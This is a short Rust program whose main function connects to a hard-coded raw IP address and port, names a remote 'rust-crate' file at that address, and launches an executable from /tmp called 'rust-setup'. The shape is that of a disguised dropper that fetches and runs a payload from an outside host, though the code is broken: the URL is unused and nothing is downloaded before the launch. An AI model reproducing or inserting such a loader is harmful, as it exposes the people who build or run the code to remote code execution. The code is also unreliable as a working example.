use std::net::TcpStream;
use std::process::Command;

fn main() {
    let url = "https://23.254.165.112:9089/rust-crate_0.1.0";
    let _ = TcpStream::connect("23.254.165.112:9089");
    let _ = Command::new("/tmp/rust-setup");
}
